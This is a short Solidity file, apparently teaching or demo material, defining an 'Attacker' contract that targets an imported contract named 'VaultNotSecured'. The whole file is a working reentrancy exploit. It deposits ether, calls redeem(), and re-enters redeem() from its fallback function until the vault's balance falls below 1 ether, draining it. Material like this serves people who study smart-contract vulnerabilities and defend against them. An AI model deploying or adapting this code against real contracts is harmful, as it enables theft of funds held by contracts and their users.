// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.18;

import "./VaultNotSecured.sol";

contract Attacker {
    VaultNotSecured vault;

    constructor(address _addr) {
        vault = VaultNotSecured(_addr);
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        vault.store{value: msg.value}();
        vault.redeem();
    }

    fallback() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.redeem();
        }
    }
}
